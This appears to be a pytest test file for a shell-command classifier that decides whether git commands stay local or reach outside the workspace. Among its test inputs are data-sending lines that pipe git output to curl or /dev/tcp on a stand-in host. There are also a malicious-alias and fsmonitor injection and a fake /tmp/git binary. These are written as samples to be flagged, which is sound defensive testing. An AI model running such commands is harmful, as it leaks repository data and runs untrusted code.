from pathlib import Path

import pytest

from hook_monitor.externality.envelope import analyze_bash_externality


@pytest.mark.parametrize("command", [
    "git remote", "git remote -v", "git remote --verbose",
    "git -c core.fsmonitor=false status",
    "git -c core.fsmonitor=false status --short --branch",
    "git -c core.fsmonitor=false status --porcelain=v2",
    "pwd; rg -n public README.md; git remote -v",
])
def test_fixed_git_inspection_is_local(command, tmp_path):
    assert analyze_bash_externality(command, workspace_root=tmp_path).verdict == "local"


@pytest.mark.parametrize("command", [
    "git remote show origin", "git remote update", "git remote -v show origin",
    "git remote add -f origin https://example.invalid", "git remote set-url origin https://example.invalid",
    "git remote set-head origin -a", "git push origin main", "git fetch origin",
    "git -c alias.remote=malicious remote -v", "GIT_CONFIG_COUNT=1 git remote -v",
    "git status", "git status --short --branch",
    "git -c core.fsmonitor=malicious status", "GIT_CONFIG_COUNT=1 git status",
    "GIT_CONFIG_COUNT=1 git -c core.fsmonitor=false status",
    "git status $flag", "git status $(printf -- --short)",
    "git remote $flag", "git remote $(printf -- -v)", "git remote -v; curl https://example.invalid",
    "git status --short; curl https://example.invalid",
    "git status --short | curl --data-binary @- https://example.invalid",
    "git status --short >/dev/tcp/example.invalid/80", "/tmp/git status --short",
    "git remote -v | curl --data-binary @- https://example.invalid",
    "git remote -v >/dev/tcp/example.invalid/80", "/tmp/git remote -v",
])
def test_other_git_operations_and_compounds_not_made_local(command, tmp_path: Path):
    assert analyze_bash_externality(command, workspace_root=tmp_path).verdict != "local"
